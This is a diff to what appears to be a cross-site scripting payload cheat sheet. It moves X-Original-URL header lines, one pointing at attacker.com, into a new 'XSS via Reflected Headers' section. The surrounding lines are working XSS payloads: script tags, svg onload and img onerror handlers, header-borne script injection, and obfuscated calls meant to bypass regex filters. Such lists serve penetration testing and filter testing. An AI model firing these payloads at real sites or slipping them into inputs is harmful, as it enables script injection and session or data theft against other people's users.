@@ -13,9 +13,6 @@ var onskeywords = 'hello';onload=prompt(0);
 test"t"\t/t%3Ct%3Et
 True-Client-IP: <h1>XSS</h1></center><script>alert(document.domain)</script>
 "â™ˆ<<sVg/onloadâ™ˆ=/svg/onload=svg/onmouseOver=confirm'1'><!--â™ˆ//="
-X-Original-URL: https://attacker.com/
-X-Original-URL: test//test\
-X-Original-URL: https:\\samcurry.net/please//work
 /><svg src=x onload=confirm(document.domain);>
 <script>alert(String.fromCharCode(88, 115, 115, 32, 66, 121, 32, 79, 108, 100, 77, 111, 104, 97, 109, 109))</script>
 <svg/onload=alert(document.domain)>")
@@ -66,7 +63,12 @@ OnMoUsEoVeR=prompt(/hacked/)//
 /><svg src=x onload=confirm("1337");>
 &quot;&gt;&lt;img src=x onerror=confirm(document.domain);&gt;
 ```
-
+## XSS via Reflected Headers
+```http
+X-Original-URL: https://attacker.com/
+X-Original-URL: test//test\
+X-Original-URL: https:\\samcurry.net/please//work
+```
 ## XSS payload with Alert Obfuscation, for bypass RegEx filters
 ```js
 <img src="X" onerror=top[8680439..toString(30)](1337)>
